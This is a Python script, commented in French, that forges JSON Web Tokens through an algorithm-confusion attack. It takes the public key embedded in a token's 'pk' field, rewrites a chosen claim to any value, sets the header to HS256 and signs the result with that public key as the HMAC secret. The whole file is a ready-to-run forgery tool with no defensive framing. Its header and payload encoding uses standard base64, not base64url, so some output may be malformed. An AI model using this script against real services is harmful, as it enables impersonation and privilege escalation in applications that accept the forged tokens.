import base64
import hmac
import json
import hashlib
import argparse

# Définir les arguments en ligne de commande
parse = argparse.ArgumentParser()
parse.add_argument('-t', '--token', help='Chemin du jeton', required=True)
parse.add_argument('-k', '--key', help='Clé à remplacer', required=True)
parse.add_argument('-v', '--value', help='Nouvelle valeur', required=True)
args = parse.parse_args()

# Lire le contenu du jeton depuis un fichier
token_file = open(args.token, 'r')
token = token_file.read()
key = args.key
value = args.value

# Afficher des informations sur les arguments
print('Jeton d\'origine: ' + token)
print('Clé à remplacer: ' + key)
print('Nouvelle valeur: ' + value)

# Diviser le jeton en ses parties
token_parts = token.split('.')

# Vérifier que le jeton a 3 parties
if len(token_parts) != 3:
    print('Erreur de jeton')
    exit(1)

# Extraire les parties du jeton
ec_header = token_parts[0]
ec_payload = token_parts[1]
ec_signature = token_parts[2]

# Ajouter des caractères '=' manquants pour assurer une base64 valide
ec_header += "=" * ((4 - len(ec_header) % 4) % 4)
ec_payload += "=" * ((4 - len(ec_payload) % 4) % 4)

# Décoder la partie du header en base64
dc_header = base64.b64decode(ec_header)

# Décoder la partie du payload en base64 et le convertir en objet JSON
dc_payload = base64.b64decode(ec_payload)
dc_payload_json = json.loads(dc_payload)

# Récupérer la clé publique (pk) à partir du payload JSON
pk = dc_payload_json.get('pk')

if pk is None:
    print('Votre jeton JWT ne contient pas de clé publique')
    exit(1)

# Créer un nouveau header
header = '{"alg":"HS256","typ":"JWT"}'
header_encoded_bytes = base64.b64encode(header.encode('utf-8'))
header_encoded = str(header_encoded_bytes, 'utf-8').rstrip("=")

# Mettre à jour la valeur de la clé spécifiée dans le payload JSON
dc_payload_json[args.key] = args.value

# Convertir le payload mis à jour en une chaîne JSON
payload = json.dumps(dc_payload_json)

# Encoder le nouveau payload en base64
payload_encoded_bytes = base64.b64encode(payload.encode('utf-8'))
payload_encoded = str(payload_encoded_bytes, 'utf-8').rstrip("=")

# Créer le nouveau jeton en concaténant le header_encoded et le payload_encoded
new_token = header_encoded + '.' + payload_encoded

# Calculer la signature HMAC-SHA256
sig = hmac.new(bytes(pk, 'utf-8'), new_token.encode('utf-8'), hashlib.sha256)

# Obtenir la représentation hexadécimale de la signature
signature_hex = sig.hexdigest()

# Encoder la signature en base64url
signature_base64 = base64.urlsafe_b64encode(bytes.fromhex(signature_hex)).rstrip(b'=').decode('utf-8')

# Concaténer la signature encodée avec le nouveau jeton pour obtenir le jeton JWT final
jwt_token = new_token + '.' + signature_base64

# Afficher le nouveau jeton
print('Nouveau jeton JWT: ' + jwt_token)
